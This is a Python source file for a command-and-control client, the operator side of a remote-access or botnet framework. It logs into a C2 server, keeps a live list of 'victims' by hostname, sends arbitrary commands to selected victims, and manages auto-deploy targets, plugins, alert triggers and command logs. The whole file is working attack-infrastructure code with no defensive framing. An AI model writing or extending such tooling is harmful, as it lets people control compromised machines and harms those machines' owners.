import requests
import socketio


class C2Client:
    def __init__(self, server_url):
        self.server_url = server_url.rstrip('/')
        self.sio = socketio.Client(reconnection=True, reconnection_delay=2)
        self.on_update = None
        self.victims = {}
        self.logs = []
        self.alert_log = []
        self.plugins = []
        self.alert_rules = []
        self.auto_deploy = []
        self.selected_hostname = None
        self.locked = True
        self.needs_setup = False
        self.connected = False
        self._setup_socketio()

    def _emit(self, event, *args):
        if self.on_update:
            try:
                self.on_update(event, *args)
            except Exception:
                pass

    def _setup_socketio(self):
        @self.sio.on('connect')
        def _on_connect():
            self.connected = True
            self._emit('connected')

        @self.sio.on('disconnect')
        def _on_disconnect(*args):
            self.connected = False
            self._emit('disconnected')

        @self.sio.on('server_state')
        def _on_server_state(data):
            self.locked = data.get('locked', True)
            self.needs_setup = data.get('needs_setup', False)
            self._emit('state_changed')

        @self.sio.on('dashboard_state')
        def _on_dashboard_state(data):
            self.victims = data.get('victims', {})
            self.logs = data.get('logs', [])
            self.auto_deploy = data.get('auto_deploy_targets', [])
            self._emit('dashboard_loaded')

        @self.sio.on('victim_update')
        def _on_victim_update(data):
            hostname = data.get('hostname')
            info = data.get('info')
            if hostname and info:
                self.victims[hostname] = info
            self._emit('victim_updated')

        @self.sio.on('victim_removed')
        def _on_victim_removed(data):
            hostname = data.get('hostname')
            self.victims.pop(hostname, None)
            if self.selected_hostname == hostname:
                self.selected_hostname = None
            self._emit('victim_removed')

        @self.sio.on('command_log_update')
        def _on_command_log(data):
            entry = data.get('entry')
            if entry:
                self.logs.insert(0, entry)
            self._emit('log_updated')

        @self.sio.on('rule_alert')
        def _on_rule_alert(data):
            self.alert_log.insert(0, data)
            self._emit('alert_received')

        @self.sio.on('server_unlocked')
        def _on_server_unlocked(data):
            self.locked = False
            self._emit('unlocked')

        @self.sio.on('server_shutting_down')
        def _on_shutdown(data):
            self._emit('shutting_down')

    def connect(self):
        self.sio.connect(self.server_url, transports=['websocket', 'polling'])

    def disconnect(self):
        self.sio.disconnect()

    def login(self, password):
        try:
            resp = requests.post(
                f"{self.server_url}/api/login",
                json={'password': password},
                timeout=10,
            )
            return resp.status_code == 200
        except Exception:
            return False

    def setup(self, password):
        try:
            resp = requests.post(
                f"{self.server_url}/api/setup",
                json={'password': password},
                timeout=10,
            )
            return resp.status_code == 200
        except Exception:
            return False

    def send_command(self, hostname, command, params=None):
        try:
            resp = requests.post(
                f"{self.server_url}/send_command",
                json={
                    'hostname': hostname,
                    'command': command,
                    'params': params or {},
                },
                timeout=10,
            )
            return resp.status_code == 200
        except Exception:
            return False

    def fetch_victims(self):
        try:
            resp = requests.get(f"{self.server_url}/victims", timeout=10)
            if resp.status_code == 200:
                return resp.json()
        except Exception:
            pass
        return {}

    def fetch_logs(self):
        try:
            resp = requests.get(f"{self.server_url}/command_log", timeout=10)
            if resp.status_code == 200:
                return resp.json()
        except Exception:
            pass
        return []

    def fetch_plugins(self):
        try:
            resp = requests.get(f"{self.server_url}/api/extensions", timeout=10)
            if resp.status_code == 200:
                self.plugins = resp.json()
                return self.plugins
        except Exception:
            pass
        return []

    def fetch_alert_rules(self):
        try:
            resp = requests.get(f"{self.server_url}/api/triggers", timeout=10)
            if resp.status_code == 200:
                self.alert_rules = resp.json()
                return self.alert_rules
        except Exception:
            pass
        return []

    def fetch_alert_log(self):
        try:
            resp = requests.get(f"{self.server_url}/api/triggers/log", timeout=10)
            if resp.status_code == 200:
                self.alert_log = resp.json()
                return self.alert_log
        except Exception:
            pass
        return []

    def load_full_state(self):
        self.victims = self.fetch_victims()
        self.logs = self.fetch_logs()
        self.fetch_plugins()
        self.fetch_alert_rules()
        self.fetch_alert_log()
        self._emit('state_loaded')
